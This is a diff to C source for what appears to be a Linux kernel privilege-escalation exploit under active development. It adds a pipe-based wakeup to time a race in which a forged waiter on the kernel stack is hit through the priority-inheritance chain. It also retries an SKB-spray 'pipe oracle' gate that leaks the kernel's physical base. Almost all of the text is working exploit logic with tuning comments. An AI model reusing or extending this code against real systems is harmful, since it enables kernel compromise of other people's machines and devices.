@@ -173,6 +173,15 @@ static atomic_int slide_consume_last_sched_errno;
 static atomic_int slide_consumer_ready;
 static atomic_int slide_stack_write_window;
 static atomic_int slide_pselect_write_window;
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+/* Campaign 20: the waiter publishes the window pipe's write end here and the
+ * consumer writes one byte only after sched_setattr_tid returns.  pselect
+ * then returns >0 and slide_stack_write_window becomes a real wakeup proof. */
+static atomic_int slide_window_write_fd = -1;
+static atomic_int slide_window_kick_count;
+static atomic_int slide_window_kick_result;
+static atomic_int slide_window_kick_errno;
+#endif
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
 static atomic_int slide_pselect_last_ret;
 static atomic_int slide_pselect_last_errno;
@@ -1044,6 +1053,12 @@ static void slide_reset_consume_state(void) {
   atomic_store(&slide_consume_last_sched_errno, 0);
   atomic_store(&slide_stack_write_window, 0);
   atomic_store(&slide_pselect_write_window, 0);
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  atomic_store(&slide_window_write_fd, -1);
+  atomic_store(&slide_window_kick_count, 0);
+  atomic_store(&slide_window_kick_result, 0);
+  atomic_store(&slide_window_kick_errno, 0);
+#endif
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
   atomic_store(&slide_pselect_last_ret, INT_MIN);
   atomic_store(&slide_pselect_last_errno, 0);
@@ -1095,6 +1110,32 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
 
   int pipefd[2] = {-1, -1};
   SYSCHK(pipe(pipefd));
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  /*
+   * Campaign 20: block_fd is a real pipe read end, not a timerfd.  The old
+   * timerfd could only expire (ret=0), so pselect never proved the window.
+   * Both ends are moved above slide_route_nfds so open_slide_selected_fds
+   * (which walks fd < nfds) cannot clobber the write end while it dups the
+   * read end onto the read-set bit.
+   */
+  int high_read = fcntl(pipefd[0], F_DUPFD, slide_route_nfds + 16);
+  int window_write = fcntl(pipefd[1], F_DUPFD, slide_route_nfds + 32);
+  close(pipefd[0]);
+  close(pipefd[1]);
+  pipefd[0] = -1;
+  pipefd[1] = -1;
+  if (high_read < 0 || window_write < 0) {
+    pr_error("slide window pipe F_DUPFD read=%d write=%d errno=%d\n",
+             high_read, window_write, errno);
+    if (high_read >= 0) {
+      close(high_read);
+    }
+    if (window_write >= 0) {
+      close(window_write);
+    }
+    return;
+  }
+#else
   int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
   if (block_fd < 0) {
     pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
@@ -1111,14 +1152,28 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
     close(pipefd[1]);
     return;
   }
+#endif
 
   fd_set in;
   fd_set out;
   fd_set ex;
   prepare_slide_pselect_fdsets(&in, &out, &ex);
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  /*
+   * Global word g0 (read set word 0, byte offset 0) lies outside the forged
+   * waiter: with the measured SLIDE_PSELECT_WORD_SHIFT=3 the compact waiter
+   * occupies g3..g13 (in words 3/4, the whole out set, ex words 0..3).  Bit
+   * 0 asks do_select for fd 0; open_slide_selected_fds dups high_read onto
+   * it because the bit is set.  The consumer's byte then makes it readable.
+   */
+  FD_SET(0, &in);
+#endif
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
   slide_reset_consume_state();
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  atomic_store(&slide_window_write_fd, window_write);
+#endif
 
   struct timespec timeout = {
 #ifdef SLIDE_PSELECT_TIMEOUT_NSEC
@@ -1210,11 +1265,15 @@ RMG_RACE_INLINE void slide_pselect_stack_copy(void) {
                ret > 0 && atomic_load(&slide_consume_sched_ok) > 0);
 
   close(high_read);
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  close(window_write);
+#else
   if (block_fd != pipefd[0]) {
     close(block_fd);
   }
   close(pipefd[0]);
   close(pipefd[1]);
+#endif
 }
 #endif
 
@@ -1816,6 +1875,28 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
       int sched_ok = atomic_load(&slide_consume_sched_ok) + 1;
       atomic_store(&slide_consume_sched_ok, sched_ok);
     }
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+    /*
+     * Campaign 20: kick the window only after sched_setattr_tid has run.
+     * The waiter must still be inside pselect while the PI chain traverses
+     * the stale waiter on its kernel stack; waking it earlier would tear the
+     * stack copy down before the write.  sched_ok is published first so the
+     * waiter's ret>0 && sched_ok test sees it as soon as the byte lands.
+     */
+    int window_fd = atomic_load(&slide_window_write_fd);
+    if (window_fd >= 0) {
+      unsigned char window_byte = 0x57;
+      ssize_t kicked;
+      do {
+        errno = 0;
+        kicked = write(window_fd, &window_byte, sizeof(window_byte));
+      } while (kicked < 0 && errno == EINTR);
+      atomic_store(&slide_window_kick_result, (int)kicked);
+      atomic_store(&slide_window_kick_errno, kicked < 0 ? errno : 0);
+      int kick_count = atomic_load(&slide_window_kick_count) + 1;
+      atomic_store(&slide_window_kick_count, kick_count);
+    }
+#endif
     atomic_store(&slide_consume_stop, 1);
     while (atomic_load(&slide_consume_go)) {
       __asm__ volatile("yield" ::: "memory");
@@ -2157,7 +2238,22 @@ static int slide_child_trigger_write(void) {
   int write_window = atomic_load(&slide_stack_write_window) != 0;
   pr_info("slide downstream verification armed sched_ok=%d write_window=%d\n",
           sched_ok, write_window);
+#if defined(APP_SLIDE_WINDOW_PIPE) && APP_SLIDE_WINDOW_PIPE
+  /*
+   * Campaign 20: sched_ok is only a syscall return, not a write proof
+   * (analysis gatemiss §0.4).  With the window pipe the pselect must have
+   * been woken by the consumer's post-sched byte; a kick miss is reported
+   * here and the parent's gate readback / fresh-page retry decides the rest.
+   */
+  pr_info("slide window pipe kick=%d write_ret=%d write_errno=%d fd=%d\n",
+          atomic_load(&slide_window_kick_count),
+          atomic_load(&slide_window_kick_result),
+          atomic_load(&slide_window_kick_errno),
+          atomic_load(&slide_window_write_fd));
+  return atomic_load(&slide_waiter_ok) != 0 && write_window;
+#else
   return atomic_load(&slide_waiter_ok) != 0 && sched_ok;
+#endif
 #else
   return atomic_load(&slide_waiter_ok) != 0 &&
          atomic_load(&slide_stack_write_window) != 0;
@@ -2533,20 +2629,45 @@ static int slide_leak_physical_base(void) {
   if (!page_base) {
     return 0;
   }
-  if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
-    pr_error("p0 physical pipe gate trigger failed\n");
-    return 0;
-  }
-  int gate_result = verify_p0_pipe_oracle_gate();
-  if (getenv("P0_ORACLE_GATE_DIAG")) {
-    pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
-    if (gate_result != 0) {
-      slide_restore_physical_oracle();
+  /*
+   * Campaign 20: a gate miss (hits=0 changed=0) costs only the SKB spray,
+   * not the pipe oracle: verify refills every reclaim pipe with the
+   * RMG-P0-PIPE marker and no forged slot exists yet.  Re-leak a fresh mm
+   * page and retrigger, bounded by APP_SLIDE_GATE_ATTEMPTS.  The gate
+   * readback is checked even when the trigger reports a window miss, so a
+   * landed write is never discarded on acceptance bookkeeping alone.
+   */
+  int gate_attempts = 1;
+#ifdef APP_SLIDE_GATE_ATTEMPTS
+  gate_attempts = APP_SLIDE_GATE_ATTEMPTS;
+#endif
+  int gate_result = 0;
+  for (int gate_attempt = 1;; gate_attempt++) {
+    int triggered = slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT);
+    gate_result = verify_p0_pipe_oracle_gate();
+    if (!triggered) {
+      pr_error("p0 physical pipe gate trigger failed attempt=%d/%d gate=%d\n",
+               gate_attempt, gate_attempts, gate_result);
     }
-    return 0;
+    if (getenv("P0_ORACLE_GATE_DIAG")) {
+      pr_info("p0 physical gate diagnostic result=%d\n", gate_result);
+      if (gate_result != 0) {
+        slide_restore_physical_oracle();
+      }
+      return 0;
+    }
+    if (gate_result != 0 || gate_attempt >= gate_attempts) {
+      break;
+    }
+    pr_warning("p0 physical pipe reclaim miss retry=%d/%d\n",
+               gate_attempt + 1, gate_attempts);
+    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
+    if (!page_base) {
+      return 0;
+    }
   }
   if (gate_result == 0) {
-    pr_warning("p0 physical pipe reclaim miss\n");
+    pr_warning("p0 physical pipe reclaim miss attempts=%d\n", gate_attempts);
     return 0;
   }
   app_publish_p0_dirty();
